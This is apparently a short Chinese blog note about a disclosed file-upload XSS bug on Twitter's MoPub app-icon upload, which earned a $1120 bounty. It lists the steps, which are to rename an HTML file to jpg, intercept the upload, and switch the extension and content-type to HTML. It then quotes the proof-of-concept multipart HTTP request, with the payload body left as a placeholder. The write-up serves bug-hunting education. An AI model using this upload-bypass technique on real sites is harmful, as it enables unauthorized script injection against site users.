# 漏洞散记
##  Twitter xss
> 漏洞非常简单，并没有多少技术需求，但是却也是蛮经典的，结合自身，这种情况确实出现过很多次了，所以写出来，可以在平时测试的时候注意一下

> 漏洞价值:1120$

## 漏洞过程

一个**File upload xss**

作者确定这个漏洞的关键点有两个：

1. server不会验证**extension**
2. server不会验证上传的type是否是**jpg/jpeg**

## 利用过程

1. 将一个写入XSS的html文件先改成jpg后缀
2. 上传抓包，然后更改成**.html**的后缀，然后在把**content-type**改成**text.html**（这点值得注意，否则好像会出错）
3. 再次打开上传的link就会弹出XSS

看一下作者的POC:
```
POST /inventory/app_icon/upload/ HTTP/1.0
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRFToken: YZ8hbuu1vB9p5s1ni2vPZ5kMrhMqeDo5
X-Requested-With: XMLHttpRequest
Referer: https://app.mopub.com/inventory/app/97142808ce5d4ace895480a3ffe7d631/
Content-Length: 389
Content-Type: multipart/form-data; boundary=---------------------------1714461176134095862036612614
Cookie: [Cookie values]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

-----------------------------1714461176134095862036612614
Content-Disposition: form-data; name="image_upload"; filename="xssfileuploadcopy.html"
Content-Type: text/html

HTML contetn
-----------------------------1714461176134095862036612614--
```

# 结语
确实不是很有难度的事情，但是个人经验，很多次会遇到这种漏洞，所以可是关注一下，将其加入到自己的测试流程中去
